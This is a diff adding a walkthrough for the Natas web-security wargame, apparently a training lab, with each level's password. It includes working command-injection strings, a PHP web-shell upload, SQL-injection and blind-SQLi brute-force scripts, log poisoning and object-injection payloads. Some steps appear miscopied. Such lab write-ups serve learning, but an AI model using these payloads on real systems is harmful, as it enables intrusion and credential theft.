@@ -1,0 +1,791 @@
+Level 0
+
+Username: natas0
+
+Password: natas0
+
+Level 1
+
+Steps:- 
+1) Right Click on the page and view its Source Code. 
+
+Username: natas1
+
+Password: gtVrDuiDfck831PqWsLEZy5gyDz1clto
+
+Level 2
+
+Steps:-
+1) Press Ctrl + U to view the Page Source
+
+Username: natas2
+
+Password: ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi
+
+Level 3
+
+Steps:-
+1) Add /files at the end of the URL
+2) Open the users.txt
+
+Username: natas3
+
+Password: sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
+
+Level 4
+
+Steps:-
+'Not Google will find it this time', This is a Reference to the Googlebot call crawler. Did some research and found that Googlebot control is in a file called robots.txt 
+
+1) Add /robots.txt at the end of the URL
+
+Here we find a disallowed Entry to /s3cr3t/ 
+
+2) Add /s3crt3 at the end of the URL
+
+3) Open the users.txt here.
+
+Username: natas4
+
+Password: Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
+
+Level 5
+
+Steps:
+1) Setup Brup Suite to Intercept the Data being Trasmitted. 
+
+2) Change the referer to natas5.natas.labs.overthewire.org
+
+3) Forward the Proxy and Check the page for the Password.
+
+Username: natas5
+
+Password: iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
+
+Level 6
+
+Steps:
+1) Setup Brup Suite to Intercet the Data being Transmitted.
+
+2) Go to the Params Tag and Change the value of loggedin Cookie to 1
+
+3) Forward the Proxy
+
+Username: natas6
+
+Password: aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
+
+Level 7
+
+Steps:
+1) View the Source Code and we find notice that it is telling to check the /includes/secret.inc
+
+2) Adding /includes/secret.inc in the URL gives us a blank page. 
+
+3) Check the Source Code of the Blank Page.
+
+4) Submit the Key and You will find the Password.
+
+Username: natas7
+
+Password: 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
+
+Level 8
+
+Steps:
+1) If we open the About Page, we notice in the URL that we have page=about, so we change it to any bogus file name, like HelloWorld.
+
+2) There is an Error when we ask for a bogus file. From this error we get to know the path and we get the Password by adding page = ../../../../etc/natas_webpass/natas8
+
+Username: natas8
+
+Password:  DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe 
+
+Level 9
+
+Steps:
+1) View the Source Code of the page and we notice some Encoding being done. So we Try to decode the same by writing the following code in any online coding enironment like onlinegdb.
+
+<?
+	echo base64_decode(strrev(pack("H*", 3d3d516343746d4d6d6c315669563362")))
+?>
+
+2) Enter Secret Key: oubWYf2kBq and get the Password
+
+Username: natas9
+
+Password: W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
+
+Level 10
+
+Steps:
+1) We enter "test" in the Input Bar. We notice in the URL that we have needle = test and submit = Search. So, now we input "test;ls" and it Displays us the file dictionary.txt
+
+2) Now we know that COMMAND INJECTION is working, so enter "test;cat ../../../../etc/natas_webpass/natas10"
+
+3) We get the Password.
+
+Username: natas10
+
+Password: nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+
+Level 11
+
+Steps:
+1) We Check the Source Code and we find that "; | &" characters are restricted to be used. So we Again Look into the code carefully and we find that the Output Command is printing the output in accordance with the input. So we try to input " a /etc/natas_webpass/natas11"
+
+2) We try many alphabets and we get the password at "u /etc/natas_webpass/natas11"
+
+Username: natas11
+
+Password: U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
+
+Level 12
+
+Steps:
+1) View the Source Code and Analyize it. We find the Cookie Key to be Encrypted. And when we Check the Cookie Data it has a default value. 
+
+2) To get the key, we execute the following php code.
+<?php
+
+function xor_encrypt($in) {
+    $key = json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff"));
+    $text = $in;
+    $outText = '';
+
+    // Iterate through each character
+    for($i=0;$i<strlen($text);$i++) {
+    $outText .= $text[$i] ^ $key[$i % strlen($key)];
+    }
+
+    return $outText;
+}
+
+echo (xor_encrypt(base64_decode("ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw")));
+
+?>
+
+
+This Returns qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq
+
+Therefore, the Key is "qw8J"
+
+3) Now, Run the following Code:
+
+function xor_encrypt($in) {
+    $key = 'qw8J';
+    $text = $in;
+    $outText = '';
+
+    // Iterate through each character
+    for($i=0;$i<strlen($text);$i++) {
+    $outText .= $text[$i] ^ $key[$i % strlen($key)];
+    }
+
+    return $outText;
+}
+
+
+echo (base64_encode(xor_encrypt(json_encode(array("showpassword"=>"yes","bgcolor"=>"#ffffff")))));
+
+This Returns: ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK
+
+4) We change the value of our Cookie and we get the password. 
+
+Username: natas12
+
+Password: EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
+
+Level 13
+
+Steps:
+1) View the Source Code and Analyze it. You will find that the file name has a extension of .jpg change it to .php
+
+<input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" />
+
+to
+
+<input type="hidden" name="filename" value="<? print genRandomString(); ?>.php" /> 
+
+This can be done by firing up the Inspector. 
+
+2) Create a file using the following Command
+
+$ echo "<?php echo system(\"cat /etc/natas_webpass/natas13\"); ?>" > natas12.jpg
+$ mv natas12.jpg natas12.php
+
+3) Upload this file and click on the php link generated. You will get the password.
+
+Username: natas13
+
+Password: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
+
+Level 14
+
+Steps:
+1) In this we are restricted to only jpeg file. So we can only upload the jpg files. Doing a bit of google, we find out about the Magic Numbers of a file. 
+They are a few bytes of the hex code of a file. They define the file type. 
+
+2) We create the following Python Script to create a PHP file which has a hex defination of jpeg. 
+
+fh = open('shell.php','w')
+fh.write('\xFF\xD8\xFF\xE0' + '<? passthru($_GET["cmd"]); ?>')
+fh.close()
+
+3) We upload the shell.php file and it gives us a filename. 
+
+4) Add the following to the URL
+
+	filename.php?cmd=cat /etc/natas_webpass/natas
+
+Username: natas14
+
+Password: Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
+
+Level 15
+
+Steps:
+1) Use the SQL Injection Attack
+	Username: 1" OR "1" = "1
+	Password: 1" OR "1" = "1
+
+Username: natas15
+
+Password: AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
+
+Level 16
+
+Steps:
+1) We view the Source Code and we find out that we have to perform a Binary Search in order to check the password's characters.
+
+2) We create a python script which first filters the characters which are present in the password and then arrange them in the correct order. 
+
+	import requests
+	import time
+	from requests.auth import HTTPBasicAuth
+
+	chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
+	filtered = ''
+	passwd = ''
+
+	for char in chars:
+		Data = {'username' : 'natas16" and password LIKE BINARY "%' + char + '%" #'}
+		r = requests.post('http://natas15.natas.labs.overthewire.org/index.php?debug',
+			auth=HTTPBasicAuth('natas15','AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), data = Data)
+		if 'exists' in r.text:
+			filtered = filtered + char
+
+	for i in range(0,32):
+		for char in filtered:
+			Data = {'username' : 'natas16" and password LIKE BINARY "' + passwd + char + '%" #'}
+			r = requests.post('http://natas15.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth('natas15',
+				'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), data = Data)
+			if 'exists' in r.text:
+				passwd = passwd + char
+				print(passwd)
+				break
+
+3) When we execute the above script, we get the password. It takes a couple of minutes but generates the password character wise. 
+
+Username: natas16
+
+Password: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
+
+Level 17
+
+Steps:
+1) We find this one again same as the one we did before. So we try performing Command Injection by $(echo doom) and we get the result.
+
+2) In order to find the password we again create and execute a python script as previous challenge. The following is the script.
+
+	import requests
+	from requests.auth import HTTPBasicAuth
+
+	auth = HTTPBasicAuth('natas16','WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')
+
+	filteredchars = ''
+	passwd = ''
+	allchars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
+
+	for char in allchars:
+		r = requests.get('http://natas16.natas.labs.overthewire.org/?needle=doomed$(grep ' + char + ' /etc/natas_webpass/natas17)', auth=auth)
+
+		if 'doomed' not in r.text:
+			filteredchars = filteredchars + char
+			print(filteredchars)
+
+	for i in range(32):
+		for char in filteredchars:
+			r = requests.get('http://natas16.natas.labs.overthewire.org/?needle=doomed$(grep ^' + passwd + char + ' /etc/natas_webpass/natas17)', auth=auth)
+
+			if 'doomed' not in r.text:
+				passwd = passwd + char
+				print(passwd)
+				break
+3) Executing the above Script, we Generate the password.
+
+Username: natas17
+
+Password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
+
+Level 18
+
+Steps:
+1) We find this one again same as the one we did before. So we try performing Command Injection by $(echo doom) and we get the result.
+
+2) In order to find the password we again create and execute a python script as previous challenge. The following is the script.
+
+	import requests
+
+	pwd_len = 32
+
+	charset_0 = (
+		'0123456789' +
+		'abcdefghijklmnopqrstuvwxyz' +
+		'ABCDEFGHIJKLMNOPQRSTUVWXYZ')
+	charset_1 = ''
+
+	target = 'http://natas17.natas.labs.overthewire.org'
+	auth=('natas17','8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')
+	sleep_time = 15
+
+	for c in charset_0:
+		username = 'natas18" AND IF(password LIKE BINARY "%%%c%%",SLEEP(%d), 1)#' % (c, sleep_time)
+		r = requests.get(target, auth=auth, params={"username": username})
+		s = r.elapsed.total_seconds()
+		if s >= sleep_time:
+			charset_1 += c
+			print ('C: ' + charset_1.ljust(len(charset_0), '*'))
+
+	print ""
+
+	password = ""
+	while len(password) != pwd_len:
+		for c in charset_1:
+			t = password + c
+			username = 'natas18" AND IF(password LIKE BINARY "%s%%",SLEEP(%d), 1)#' % (t, sleep_time)
+			r = requests.get(target, auth=auth, params={"username": username})
+			s = r.elapsed.total_seconds()
+			if s >= sleep_time:
+				print ('P: ' + t.ljust(pwd_len, '*'))
+				password = t
+				break
+
+3) Executing the above Script, we Generate the password.
+
+Username: natas18
+
+Password: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
+
+Level 19
+
+Steps:
+1) Anaylysing its Source Code, we find that we will get the password to next level when the Session ID will contain the result "You are an admin"
+
+2) To achieve our goal, we create the following Python Script
+
+	import requests
+
+	target = 'http://natas18.natas.labs.overthewire.org'
+	auth = ('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')
+	params = dict(username = 'admin', password = 's3cr3t')
+	cookies = dict()
+
+	max_s_id = 640
+	s_id = 1
+
+	while(s_id <= max_s_id):
+		print("Trying with PHPSESSID = " + str(s_id))
+		cookies = dict(PHPSESSID = str(s_id))
+		r = requests.get(target, auth=auth, params=params,
+			cookies=cookies)
+		if "You are an admin" in r.text:
+			print (r.text)
+			break
+		s_id = s_id + 1
+
+3) When we execute the above script, we get the password in the html script generated.
+
+Username: natas19
+
+Password: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs
+
+Level 20
+
+Steps:
+1) In this challenege we cannot check its Source Code, so he run Burp Suite to check its code. To look for the point to check, we send multiple inputs and we find that everytime a new Session ID is being generated but its last few characters are same. 
+
+2) We Copy its Session ID and decode it using the decoder available in Burp Suite. Set Decode as "ASCII Hex". We find that the Session ID is ending with "-admin". So we again go for the Brute Forcing Technique.
+
+3) We use the following Script. 
+
+	import requests
+	from requests.auth import HTTPBasicAuth
+	from time import sleep
+
+	def main():
+		Auth = HTTPBasicAuth('natas19','4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')
+		Data = {'username':'admin','password':'admin','admin':'1'}
+		maxchange = 0
+
+		for i in range(0,640):
+			sesstr = str(i) + '-admin'
+			sessid = sesstr.encode('hex')
+			cookie = {"PHPSESSID": sessid}
+			r = requests.get("http://natas19.natas.labs.overthewire.org/index.php?debug", params = Data, auth = Auth, cookies = cookie)
+			if('logged in as a regular user' not in r.text):
+				print("Admin:",i)
+				print(r.text)
+				break
+	
+		return
+
+	if __name__ == '__main__':
+		main()
+
+4) When we execute the above script we get our Result.
+
+Username: natas20
+
+Password: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF
+
+Level 21
+
+Steps:
+1) In this we have a different type of session management. Here the mywrite function is responsible to create a session and we will only get the admin session if the Session ID is equal to 1. So what we do, we run the debug mode by adding "\index.php?debug" at the end of the code. We enter admin in the given field and see the result. Then we enter "admin\nadmin 1". We notice that a if a session is already created, the myread function will get the data of the current session 
+
+2) We know that when we will input "admin\nadmin 1", the URL will be \name=admin%0Aadmin%201 at the end. So we use the following curl command
+
+curl "http://natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF@natas20.natas.labs.overthewire.org?name=admin%0Aadmin%201" --cookie "PHPSESSID=test"
+
+3) To get the data from myread function we use the following curl command and keep in mind that the Session ID should be same. 
+
+curl "http://natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF@natas20.natas.labs.overthewire.org" --cookie "PHPSESSID=test"
+
+Username: natas21
+
+Password: IFekPyrQXftziDEsUr3x21sYuahypdgJ
+
+Level 21:
+
+Steps:
+1) In this we see, to get the admin session we need to to perform a cross-site session hijacking. We go to natas21-experiment.natas.labs.overthewire.org. In the backgroud we run Burp Suite and Make its intercept on. When we go to the experiment page, we click on update and on the Burp we get its details. 
+
+2) In burp, edit the last line by adding "&admin=1" just after the Update. It should be "Update&admin=1". We also copy its current PHPSESSID. 
+
+3) Then we go back to the natas21 page from the given link. Intercept is still on. 
+
+4) Now in the Burp, we change the Session ID of natas21 with the Session ID on natas21-experiment(The one we copied) and we forward the proxy. 
+
+5) Check the natas21 page, we will get our password.
+
+Username: natas22
+
+Password: chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ
+
+Level 22:
+
+Steps:
+1) In the Source Code, we find that we have two response functions. The first one simply returns the original page. The Second one will only respond when it will find the "revelio" parameter. 
+
+2) So we add the "?revelio=test" at the end of the URL and there is no such change in the page. So we decide to check the response on the Terminal using the curl command
+
+3) We run the following command
+
+curl "http://natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF@natas20.natas.labs.overthewire.org" --cookie "PHPSESSID=test"
+
+4) Here we get our result.
+	
+
+Username: natas23
+
+Password: D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE
+
+Level 24:
+
+Steps:
+1) In this we have two Conditions
+	- The password must contain the substring iloveyou
+	- The password length should be greater than 10
+
+2) We input 100iloveyou and we get our result.
+
+Username: natas24
+
+Password: OsRmXFguozKpTZZ5X14zNO43379LZveg
+
+Level 25
+
+Steps:
+1) When we open the Source Code, we find that it is using strcmp() function to compare the Request and Password. The first thought of Brute Forcing was not good because that will be around 20! No use.
+
+2) Google strcmp php Vulnerabilities, this shows us that each parather in the strcmp() function should be string. So we input Array() to change the first parameter to Array but it didn't worked.
+
+3) We Realize that we can make changes in the URL also, so we change the passwd = test to passwd[]=0 and we get our result.
+
+Username: natas25
+
+Password: GHF6X7YwACaYYssHVY05cFq83hRktl4c
+
+Level 26
+
+Steps:
+1) In the Source Code, we find that Directory Traversal is not possible. Using "../" is restricted. And whenever we will go to "/etc/webpass_natas/natas26" a log will be created.
+
+2) To get the password, we create the following Script.
+
+	import requests
+	from requests.auth import HTTPBasicAuth
+
+	HOST = 'http://natas25.natas.labs.overthewire.org/index.php'
+	auth = HTTPBasicAuth('natas25', 'GHF6X7YwACaYYssHVY05cFq83hRktl4c')
+
+	payload = '''<?php echo "OK GOOGLE"; include("/etc/natas_webpass/natas26");?>'''
+
+	r = requests.get(HOST, auth=auth)
+	sid = r.cookies['PHPSESSID']
+	cookies = dict(PHPSESSID=sid)
+	params = dict(lang='....//....//....//....//....//....//....///var/www/natas/natas25/logs/natas25_{0}.log'.format(sid))
+	headers = {'user-agent': payload}
+	r = requests.get(HOST, params=params, auth=auth, headers=headers, cookies=cookies)
+
+	print r.content.split('OK GOOGLE')[1].split()[0]
+
+Note: In lang='....//....//....//....//....//(Check your Source Code and Enter the Given Path)'
+
+3) When you will execute the following script, you will get the password.
+
+Username: natas 26
+
+Password: oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
+
+Level 27
+
+Steps:
+1) Enter some random value in X1, Y1, X2, Y2 and draw two lines.
+
+2) By Analysing the Source Code, we notice that the it is creating a log of every visit to a link. 
+
+3) So, to get the password, we make a few changes in the Logger Class and Insert the file using burp suite. Below is the php file we create.
+
+	<?php
+	class Logger {
+	    private $logFile;
+	    private $initMsg;
+	    private $exitMsg;
+	    
+	    function __construct($file){
+		$this->exitMsg = "natas27:<? include '/etc/natas_webpass/natas27'; ?>";
+		$this->logFile = "img/NlP6TEsjSEMY5D.php";
+	    }
+	    function log($msg){
+		;
+	    }
+	    function __destruct(){
+		;
+	    }
+	}
+	$payload = new Logger("NlP6TEsjSEMY5D");
+	
+	echo urlencode(base64_encode(serialize($payload)));
+	?>
+
+4) We execute the above code using the following command, php filename.php and we get a encoded URL. 
+
+5) Now we run Burp Suite and When we reload our natas26.natas.labs.overthewire.org and we get the data being transmitted over the network. We notice that the drawing attribute is also being passed as an encodedURL. So we replace this encodedURL with the one we generated using our PHP Script and then we forward our link. 
+
+6) Now we add "img/NlP6TEsjSEMY5D.php" at the end of our URL, removing ?x=... and we get our Password
+
+Username: natas27
+
+Password: 55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ
+
+Level 28
+
+Steps:
+1) In this level we manipulate the SQL VARCHAR vulnerability. We create a user as "natas28  :TooMuchWhiteSpace: a" and Password is 1'OR'1'='1
+
+2) Now we again enter a username, "natas28 :TooMuchWhiteSpace: a" and Submit without any password. 
+
+3) Now we enter "natas28" as username and Submit. We get our Password.
+
+Username: natas28
+
+Password: JWwR438wkgTsNKBbcJoowyysdM82YjeF
+
+Level 29
+
+Steps:
+1) Whenever we submit a Query, we notice in the URL that an encoded String is being passed. We copy the same. 
+
+2) After Submitting multiple Queires we notice that the encoded String is not changed. So we try submitting some Special Characters to get the Special Character we need and we come up with the "%" sign.
+
+3) We also notice a few more things.
+	- The Encryption being used is done in ECB Mode. 
+	- Block size is 16 bytes and 10 bytes of input mak up the first available block.
+	- Input Sanitization is taking Place
+	- Some Data is being appended to the User Input
+
+4) We need an Encrypted Version of our SQL Injection so that we can directly get data from the previous blocks.
+
+5) We use the following Script for the above task.
+
+    # -*- coding: utf-8 -*-
+    import os
+    import requests
+    import base64
+    import urllib2
+    import urllib
+    def make_request(url,auth,query):
+        r = requests.post(url, auth=auth,data=query,allow_redirects=True)
+        return r
+    def get_cipher(url):
+        try:
+            cipher = base64.b64decode(requests.utils.unquote(url.split('query=')[1]))
+            return cipher
+        except Exception as e:
+            print("Error in parsing URL")
+            return None
+        return
+        
+    def init_pad(ch,num):
+        a = ch * num
+        return a
+        
+    def find_block_param(url, auth):
+        bs_ctr = 0
+        len_list = []
+        qry_list = []
+        s_list = []
+        print("Starting queries")
+        for i in range(1,10):
+            resp = make_request(url,auth,{"query":'a'*i})
+            qry = get_cipher(resp.url)
+            print base64.b64encode(qry)
+            len_list.append(len(qry))
+            s_list.append(len('a'*i))
+            qry_list.append(base64.b64encode(qry))
+        print("All queries done")
+        set_list = list(set(len_list))
+        block_size = set_list[1] - set_list[0]
+        first_block = len_list.count(set_list[0])
+        return first_block, block_size, common_length
+           
+            
+    def main():
+        url = 'http://natas28.natas.labs.overthewire.org/'
+        injection_url = url + 'search.php/?query='
+        auth = requests.auth.HTTPBasicAuth('natas28','JWwR438wkgTsNKBbcJoowyysdM82YjeF')
+        sterm = 'query'
+        
+        block_size = 16
+        block_completion_str = init_pad(" ",10) 
+        ref_query = get_cipher(make_request(url,auth,{sterm:block_completion_str}).url)
+        first_part = ref_query[:3*block_size]
+        last_part = ref_query[3*block_size:]
+       
+        injection_qry = init_pad(' ',9) + "' UNION SELECT password from users;#" 
+        injection = get_cipher(make_request(url,auth,{sterm:injection_qry}).url)
+        injection_size = (len(injection_qry))/block_size
+        if((len(injection_qry)-(10))%block_size!=0): 
+            injection_size += 1
+        final_query = first_part + injection[3*block_size:(3*block_size + (injection_size*block_size))] + last_part
+        final_query = requests.utils.quote(base64.b64encode(final_query)).replace('/','%2F')
+        attack_resp = requests.get(injection_url+final_query,auth=auth)
+        print attack_resp.text
+        return
+    if __name__ == '__main__':
+        main()
+
+6) When we execute the above Script, we get our Password
+
+Username: natas29
+
+Password: airooCaiseiyee8he8xongien9euhe8b
+
+Level 30
+
+Steps:
+1) When we select any one of the Dropdown, we notice in the URL that file=perl+underground. So we try Command Injection by manipulating URL as file=|cat+index.pl%00 and we notice a change in the webpage and also we get a code. 
+
+2) In the code, we notice that it is filtering the word "natas" in the URL, so we perform some changes in the URL
+
+3) We enter the URL as file=|cat+/etc/na%22%22tas_webpass/nat%22%22as30%00 and we get our Password.
+
+Username: natas30
+
+Password: wie9iexae0Daihohv8vuu3cei9wahf0e
+
+Level 31
+
+Steps:
+1) In this it is taking the Username and Password and POST query and prepares the MYSQL query to the Database
+
+2) Now the String is passed through the quote() function which is removing all the special characters.There is a Vulnerability in this function, if you will pass an array to this function, it will treat it as parameters.
+
+3) To Exploit the Vulnerability, we create the following Script.
+
+    import requests
+    auth = requests.auth.HTTPBasicAuth("natas30","wie9iexae0Daihohv8vuu3cei9wahf0e")
+    url = "http://natas30.natas.labs.overthewire.org/index.pl"
+    params={"username": "natas31", "password": ["'skipping' or 1",4]}
+    response = requests.post(url,auth=auth,data=params)
+    print response.text
+
+4) When we execute the above Script, we get our Password.
+
+Username: natas31
+
+Password: hay7aecuungiuKaezuathuk9biin0pu1
+
+Level 32
+
+Steps:
+1) Create a file with any name, Let us take "test.csv". 
+
+2) Turn on your proxy and setup your BurpSuite. Turn on the intercept. Upload the test.csv file. 
+
+3) In the Intercept, Edit the POST as following
+
+POST /index.pl?/bin/cat%20/etc/natas_webpass/natas32%20| HTTP/1.1
+
+4) When you will forward the intercepted data with the above changes, you will get the password.
+
+Username: natas32
+
+Password: no1vohsheCaiv3ieH4em1ahchisainge
+
+Level 33
+
+Steps:
+1) This level is also same as the previous one. In this we need to Edit the POST Request twice. 
+
+2) First we Edit the POST as following
+
+POST /index.pl?/bin/ls%20-al%20.%20| HTTP/1.1
+
+This will provide us with a directory listing.
+
+3) In the directory listing we execute the getpassword file by Editing the POST as follows
+
+POST /index.pl?./getpassword%20| HTTP/1.1
+
+Username: natas33
+
+Password: shoogeiGa2yee3de6Aex8uaXeech5eey
+
+Level 34
+
+Steps:
+
+Username: natas34
+
+Password:
+
+
+
+
+
+
+
+
